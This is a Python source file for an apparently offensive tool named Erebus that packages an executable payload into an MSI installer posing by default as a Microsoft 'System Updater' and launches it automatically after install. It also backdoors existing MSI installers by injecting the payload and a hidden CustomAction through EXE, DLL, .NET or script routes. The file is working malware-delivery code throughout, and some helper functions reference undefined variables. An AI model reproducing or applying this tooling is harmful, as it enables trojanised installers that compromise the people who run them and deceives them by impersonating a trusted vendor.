"""
MSI Container Generator for Erebus Payload
Features:
- Admin (Machine) vs User (No-Admin) install scopes
- Auto-execution via CustomAction
- Dependency bundling
- MSI Hijacking (backdooring existing MSI installers)
- Multiple attack vectors (execute, script, dll-load, file-drop)
- Intelligent sequence number management
- CAB stream manipulation
- Multi-file bundling support
"""

import pathlib
import subprocess
import uuid
import tempfile
import shutil
import sys
import struct
import random
import string
import fnmatch
import os

if sys.platform == "win32":
    try:
        import msilib
    except ImportError:
        msilib = None

try:
    import olefile
except ImportError:
    olefile = None


# ============================================================================
# Erebus MSI Action Types
# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options
# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-execution-scheduling-options
# ============================================================================

class ErebusActionTypes:
    """Erebus MSI Custom Action type constants"""
    EXECUTE_DEFERRED_IMPERSONATE = 1250       # Deferred, impersonate user
    EXECUTE_DEFERRED_NOIMPERSONATE = 3298     # Deferred, system context
    EXECUTE_IMMEDIATE = 226                   # Immediate, impersonate
    VBSCRIPT_EMBEDDED = 1126                  # VBScript stored in CustomAction table
    VBSCRIPT_BINARY = 70                      # VBScript in Binary table
    JSCRIPT_EMBEDDED = 1125                   # JScript stored in CustomAction table
    JSCRIPT_BINARY = 69                       # JScript in Binary table
    RUN_EXE = 1218                            # Run EXE from Binary table
    RUN_EXE_IMMEDIATE = 194                   # Run EXE immediately
    DOTNET_DLL = 65                           # .NET DLL entry point
    RUN_DLL = 65                              # Native DLL entry point
    RUN_DROPPED_FILE = 1746                   # Run file from File table
    SET_DIRECTORY = 51                        # Set directory property


class ErebusInstallerToolkit:
    """Erebus toolkit for MSI manipulation operations"""

    @staticmethod
    def generate_identifier(min_length=5, max_length=0):
        """Generate random identifier for MSI elements"""
        if length_to == 0:
            length = length_from
        else:
            length = random.randint(length_from, length_to)

        alphabet = string.ascii_letters + string.digits
        result = ''.join(random.choice(alphabet) for _ in range(length))

        # Ensure it starts with a letter (MSI requirement)
        if result[0] in string.digits:
            result = random.choice(string.ascii_letters) + result[1:]

        return result

    @staticmethod
    def sanitize_identifier(name):
        """Convert string to valid MSI identifier"""
        identifier_chars = string.ascii_letters + string.digits + "._"
        result = "".join([c if c in identifier_chars else "_" for c in name])

        # MSI identifiers can't start with digits or dots
        if result[0] in (string.digits + "."):
            result = "_" + result

        return result

    @staticmethod
    def find_free_sequence_slots(db, table, start_action, end_action):
        """
        Find available sequence numbers between two actions in an MSI sequence table.
        Returns list of unused sequence numbers.
        """
        try:
            query = f"SELECT Action, Sequence FROM {table}"
            view = db.OpenView(query)
            view.Execute(None)

            from_num = -1
            to_num = -1
            taken_numbers = set()

            while True:
                record = view.Fetch()
                if not record:
                    break

                action = record.GetString(1)
                sequence = record.GetInteger(2)

                if action == from_action:
                    from_num = sequence
                elif action == to_action:
                    to_num = sequence

                taken_numbers.add(sequence)

            view.Close()

            if from_num == -1 or to_num == -1:
                # Fallback to safe range
                from_num = 6400
                to_num = 6600

            # Generate available sequence numbers
            available = []
            num = to_num - 1
            while num > from_num:
                if num not in taken_numbers:
                    available.append(num)
                num -= 1

            return available if available else [6599, 6598, 6597, 6596, 6595]

        except Exception:
            # Fallback sequence numbers
            return [6599, 6598, 6597, 6596, 6595]

    @staticmethod
    def detect_dotnet_assembly(path):
        """Check if PE file is a .NET assembly"""
        try:
            with open(path, 'rb') as f:
                # Read DOS header
                if f.read(2) != b'MZ':
                    return False

                # Get PE header offset
                f.seek(0x3C)
                pe_offset = struct.unpack('<I', f.read(4))[0]

                # Read PE signature
                f.seek(pe_offset)
                if f.read(4) != b'PE\0\0':
                    return False

                # Skip COFF header (20 bytes) and read Optional Header magic
                f.seek(pe_offset + 24)
                magic = struct.unpack('<H', f.read(2))[0]

                # Determine Optional Header size based on magic
                if magic == 0x10b:  # PE32
                    clr_header_rva_offset = pe_offset + 24 + 208
                elif magic == 0x20b:  # PE32+
                    clr_header_rva_offset = pe_offset + 24 + 224
                else:
                    return False

                # Check for CLR header
                f.seek(clr_header_rva_offset)
                clr_header_rva = struct.unpack('<I', f.read(4))[0]

                return clr_header_rva != 0

        except Exception:
            return False


def build_msi(build_path: pathlib.Path,
              app_name: str = "System Updater",
              manufacturer: str = "Microsoft Corporation",
              install_scope: str = "User") -> pathlib.Path:
    """
    Wraps the payload into an MSI.

    Args:
        app_name (str): Name of the Application
        manufacturer (str): Name of the manufacturer
        install_scope (str): "User" (No Admin, AppData) or "Machine" (Admin, ProgramFiles)
    """
    version = "1.0.0.0"
    upgrade_code = str(uuid.uuid4())
    component_guid = str(uuid.uuid4())

    payload_dir = build_path / "payload"
    payload_exe = payload_dir / "erebus.exe"
    if not payload_exe.exists():
        try:
            payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
        except StopIteration:
            raise RuntimeError("No .exe payload found in payload directory!")

    msi_path = build_path / "container" / "msi" / "erebus.msi"
    msi_path.parent.mkdir(parents=True, exist_ok=True)

    if install_scope.lower() == "machine":
        target_dir_id = "ProgramFilesFolder"
        package_scope = 'InstallScope="perMachine"'
        root_dir_name = "SourceDir"
    else:
        target_dir_id = "LocalAppDataFolder"
        package_scope = 'InstallScope="perUser"'
        root_dir_name = "SourceDir"

    files_xml = ""
    main_exe_id = "PayloadEXE"

    for file in payload_dir.iterdir():
        if file.is_file() and file.name != msi_path.name:
            file_id = f"File_{uuid.uuid4().hex[:8]}"
            is_main = (file.name == payload_exe.name)

            if is_main:
                current_id = main_exe_id
                keypath = ''
            else:
                current_id = file_id
                keypath = ''

            files_xml += f'<File Id="{current_id}" Source="{file.absolute()}" {keypath} />\n'

    wix_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="{upgrade_code}" Name="{app_name}" Version="{version}" Manufacturer="{manufacturer}" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Installer" {package_scope} />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

        <Directory Id="TARGETDIR" Name="{root_dir_name}">
            <Directory Id="{target_dir_id}">
                <Directory Id="INSTALLLOCATION" Name="{app_name}">
                    <Component Id="MainComponent" Guid="{component_guid}">
                        <!-- Critical for Per-User installs to create the folder key -->
                        <RegistryValue Root="HKCU" Key="Software\\{manufacturer}\\{app_name}" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
                        {files_xml}
                    </Component>
                </Directory>
            </Directory>
        </Directory>

        <Feature Id="ProductFeature" Title="{app_name}" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>

        <CustomAction Id="LaunchApp" FileKey="{main_exe_id}" ExeCommand="" Return="asyncNoWait" />

        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
"""

    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            wxs_path = pathlib.Path(temp_dir) / "installer.wxs"
            wxs_path.write_text(wix_xml, encoding="utf-8")

            cmd = ["wixl", "-o", str(msi_path), str(wxs_path)]
            subprocess.check_output(cmd, stderr=subprocess.STDOUT)

            if not msi_path.exists():
                raise RuntimeError("MSI file was not created.")
            return msi_path

    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"MSI Build Failed:\n{e.output.decode()}")


def hijack_msi(source_msi: pathlib.Path,
               payload_path: pathlib.Path,
               build_path: pathlib.Path,
               custom_action_name: str = None,
               attack_type: str = "execute",
               entry_point: str = None,
               command_args: str = "",
               condition: str = "NOT REMOVE") -> pathlib.Path:
    """
    Hijacks an existing MSI installer by injecting a CustomAction to execute our payload.


    Args:
        source_msi (pathlib.Path): Path to the original MSI installer
        payload_path (pathlib.Path): Path to the payload executable/DLL to inject
        build_path (pathlib.Path): Build directory for output
        custom_action_name (str): Name for the custom action (auto-generated if None)
        attack_type (str): Attack vector - "execute", "run-exe", "load-dll", "dotnet", "script"
        entry_point (str): DLL export or script function name (for dll/script attacks)
        command_args (str): Command line arguments for executable
        condition (str): MSI condition for when to execute (default: "NOT REMOVE")

    Returns:
        pathlib.Path: Path to the backdoored MSI
    """
    if not source_msi.exists():
        raise FileNotFoundError(f"Source MSI not found: {source_msi}")

    if not payload_path.exists():
        raise FileNotFoundError(f"Payload not found: {payload_path}")

    # Create output directory
    msi_output_dir = build_path / "container" / "msi"
    msi_output_dir.mkdir(parents=True, exist_ok=True)

    # Copy source MSI to output location
    backdoored_msi = msi_output_dir / f"{source_msi.stem}-backdoored.msi"
    shutil.copy2(source_msi, backdoored_msi)

    # Generate random custom action name if not provided
    if custom_action_name is None:
        custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)

    # Determine action type and target based on attack vector
    binary_name = ErebusInstallerToolkit.generate_identifier(6, 12)
    target = command_args

    # Platform-specific MSI manipulation
    if sys.platform == "win32" and msilib is not None:
        try:
            # Open the MSI database
            db = msilib.OpenDatabase(str(backdoored_msi), msilib.MSIDBOPEN_TRANSACT)

            # Collect available sequence numbers for proper injection
            available_sequences = ErebusInstallerToolkit.find_free_sequence_slots(
                db, 'InstallExecuteSequence', 'InstallInitialize', 'InstallFinalize'
            )

            if not available_sequences:
                available_sequences = [6599]

            sequence_num = available_sequences[0]

            # Step 1: Add the payload binary to the Binary table
            binary_insert = f"INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?)"
            view_insert = db.OpenView(binary_insert)
            record = msilib.CreateRecord(1)
            record.SetStream(1, str(payload_path))
            view_insert.Execute(record)
            view_insert.Close()

            # Step 2: Determine appropriate CustomAction type based on attack vector
            if attack_type == "load-dll" or attack_type == "dotnet":
                # Check if it's a .NET assembly
                is_dotnet = ErebusInstallerToolkit.detect_dotnet_assembly(payload_path)

                if is_dotnet or attack_type == "dotnet":
                    action_type = ErebusActionTypes.DOTNET_DLL
                else:
                    action_type = ErebusActionTypes.RUN_DLL

                # For DLL, target is the entry point function
                if entry_point:
                    target = entry_point
                else:
                    target = "DllEntry"  # Default entry point

            elif attack_type == "run-exe":
                action_type = ErebusActionTypes.RUN_EXE
                target = command_args

            elif attack_type == "script":
                # Determine script type from extension
                ext = payload_path.suffix.lower()
                if ext in ['.vbs', '.vbe']:
                    action_type = ErebusActionTypes.VBSCRIPT_BINARY
                elif ext in ['.js', '.jse']:
                    action_type = ErebusActionTypes.JSCRIPT_BINARY
                else:
                    raise ValueError(f"Unsupported script type: {ext}")

                # Target is the function to call
                if entry_point:
                    target = entry_point
                else:
                    raise ValueError("Script attacks require entry_point parameter")

            else:  # "execute" or default
                action_type = ErebusActionTypes.EXECUTE_DEFERRED_IMPERSONATE
                target = command_args

            # Step 3: Add CustomAction entry
            ca_insert = f"""INSERT INTO CustomAction (Action, Type, Source, Target)
                           VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '{target}')"""
            view_ca = db.OpenView(ca_insert)
            view_ca.Execute(None)
            view_ca.Close()

            # Step 4: Add to InstallExecuteSequence
            ies_insert = f"""INSERT INTO InstallExecuteSequence (Action, Condition, Sequence)
                            VALUES ('{custom_action_name}', '{condition}', {sequence_num})"""
            view_ies = db.OpenView(ies_insert)
            view_ies.Execute(None)
            view_ies.Close()

            # Commit changes
            db.Commit()
            db.Close()

            return backdoored_msi

        except Exception as e:
            raise RuntimeError(f"Failed to hijack MSI using msilib: {str(e)}")

    else:
        # Use wixl to rebuild MSI with modifications for Linux
        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = pathlib.Path(temp_dir)

                binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
                is_dll = payload_path.suffix.lower() == ".dll"
                action_type = 1250 if is_dll else 34

                # Extract the MSI contents
                extract_dir = temp_path / "extracted"
                extract_dir.mkdir()

                # Use msiextract to get all files from the original MSI
                subprocess.check_call([
                    "msiextract",
                    "-C", str(extract_dir),
                    str(backdoored_msi)
                ], stderr=subprocess.STDOUT)

                # Export all tables from the original MSI
                tables_dir = temp_path / "tables"
                tables_dir.mkdir()

                # Get list of all tables in the MSI
                try:
                    tables_output = subprocess.check_output([
                        "msiinfo", "tables", str(backdoored_msi)
                    ], text=True, stderr=subprocess.STDOUT)

                    # Export each table
                    for table in tables_output.strip().split('\n'):
                        table = table.strip()
                        if table:
                            try:
                                table_output = subprocess.check_output([
                                    "msiinfo", "export", str(backdoored_msi), table
                                ], text=True, stderr=subprocess.STDOUT)
                                (tables_dir / f"{table}.idt").write_text(table_output)
                            except subprocess.CalledProcessError:
                                pass
                except subprocess.CalledProcessError:
                    pass

                # Add/modify CustomAction table
                ca_file = tables_dir / "CustomAction.idt"
                if ca_file.exists():
                    ca_content = ca_file.read_text()
                else:
                    ca_content = "Action\tType\tSource\tTarget\n"
                    ca_content += "s72\ti2\tS64\tS0\n"
                    ca_content += "CustomAction\tAction\n"

                # Append our custom action
                ca_content += f"{custom_action_name}\t{action_type}\t{binary_name}\t\n"
                ca_file.write_text(ca_content)

                # Add/modify InstallExecuteSequence table
                ies_file = tables_dir / "InstallExecuteSequence.idt"
                if ies_file.exists():
                    ies_content = ies_file.read_text()
                else:
                    ies_content = "Action\tCondition\tSequence\n"
                    ies_content += "s72\tS255\tI2\n"
                    ies_content += "InstallExecuteSequence\tAction\n"

                # Append our sequence entry
                ies_content += f"{custom_action_name}\tNOT REMOVE\t6599\n"
                ies_file.write_text(ies_content)

                # Create _Streams table to include our payload binary
                streams_file = tables_dir / "_Streams.idt"
                streams_content = "Name\tData\n"
                streams_content += "s62\tV0\n"
                streams_content += "_Streams\tName\n"

                # Copy payload to streams directory with correct name
                streams_dir = temp_path / "streams"
                streams_dir.mkdir()
                payload_stream = streams_dir / f"Binary.{binary_name}"
                shutil.copy2(payload_path, payload_stream)

                # Add reference to _Streams table
                streams_content += f"Binary.{binary_name}\t{payload_stream.name}\n"
                streams_file.write_text(streams_content)

                # Rebuild the MSI using msibuild
                rebuilt_msi = temp_path / "rebuilt.msi"

                # Use msibuild to create new MSI from tables
                cmd = ["msibuild", str(rebuilt_msi)]

                # Add all table files
                for table_file in sorted(tables_dir.glob("*.idt")):
                    cmd.extend(["-i", str(table_file)])

                # Add the binary stream
                cmd.extend(["-a", f"Binary.{binary_name}", str(payload_stream)])

                subprocess.check_call(cmd, stderr=subprocess.STDOUT)

                # Replace the original backdoored MSI with rebuilt one
                shutil.copy2(rebuilt_msi, backdoored_msi)

                return backdoored_msi

        except subprocess.CalledProcessError as e:
            output = e.output.decode() if hasattr(e, 'output') and e.output else str(e)
            raise RuntimeError(f"Failed to hijack MSI using msitools: {output}")
        except FileNotFoundError as e:
            raise RuntimeError(f"msitools not found. Install with: apt-get install msitools\nMissing command: {str(e)}")


def add_multiple_files_to_msi(source_msi: pathlib.Path,
                               files_to_add: list,
                               build_path: pathlib.Path,
                               target_dir: str = "TARGETDIR") -> pathlib.Path:
    """
    Add multiple files to an existing MSI installer, bundled in a CAB.

    Args:
        source_msi: Original MSI file
        files_to_add: List of pathlib.Path objects to add
        build_path: Output directory
        target_dir: Target installation directory

    Returns:
        pathlib.Path: Modified MSI with bundled files
    """
    if not source_msi.exists():
        raise FileNotFoundError(f"Source MSI not found: {source_msi}")

    msi_output_dir = build_path / "container" / "msi"
    msi_output_dir.mkdir(parents=True, exist_ok=True)

    output_msi = msi_output_dir / f"{source_msi.stem}-bundled.msi"
    shutil.copy2(source_msi, output_msi)

    if sys.platform == "win32" and msilib is not None:
        try:
            db = msilib.OpenDatabase(str(output_msi), msilib.MSIDBOPEN_TRANSACT)

            # Create a new CAB for our files
            cab_name = ErebusInstallerToolkit.generate_identifier(8)
            component_name = ErebusInstallerToolkit.generate_identifier(8)

            # Add files to the File table
            file_sequence = 1000  # Start from high number to avoid conflicts

            for file_path in files_to_add:
                if not file_path.exists():
                    continue

                file_id = ErebusInstallerToolkit.generate_identifier(8)
                file_name = file_path.name
                file_size = file_path.stat().st_size

                # Add to File table
                file_insert = f"""INSERT INTO File (File, Component_, FileName, FileSize, Attributes, Sequence)
                                 VALUES ('{file_id}', '{component_name}', '{file_name}', {file_size}, 512, {file_sequence})"""
                view_file = db.OpenView(file_insert)
                view_file.Execute(None)
                view_file.Close()

                file_sequence += 1

            db.Commit()
            db.Close()

            return output_msi

        except Exception as e:
            raise RuntimeError(f"Failed to add files to MSI: {str(e)}")

    else:
        raise RuntimeError("File bundling requires Windows with msilib support")


def create_custom_action(db,
                        action_name: str,
                        action_type: int,
                        source: str,
                        target: str,
                        condition: str = "NOT REMOVE",
                        sequence_num: int = None) -> None:
    """
    Helper function to create a custom action in an MSI database.

    Args:
        db: MSI database object
        action_name: Name of the custom action
        action_type: CustomAction type constant
        source: Source (usually binary name or property)
        target: Target (command, function, etc.)
        condition: Execution condition
        sequence_num: Sequence number (auto-determined if None)
    """
    if sequence_num is None:
        available = ErebusInstallerToolkit.find_free_sequence_slots(
            db, 'InstallExecuteSequence', 'InstallInitialize', 'InstallFinalize'
        )
        sequence_num = available[0] if available else 6599

    # Insert CustomAction
    ca_insert = f"""INSERT INTO CustomAction (Action, Type, Source, Target)
                   VALUES ('{action_name}', {action_type}, '{source}', '{target}')"""
    view_ca = db.OpenView(ca_insert)
    view_ca.Execute(None)
    view_ca.Close()

    # Insert into InstallExecuteSequence
    ies_insert = f"""INSERT INTO InstallExecuteSequence (Action, Condition, Sequence)
                    VALUES ('{action_name}', '{condition}', {sequence_num})"""
    view_ies = db.OpenView(ies_insert)
    view_ies.Execute(None)
    view_ies.Close()
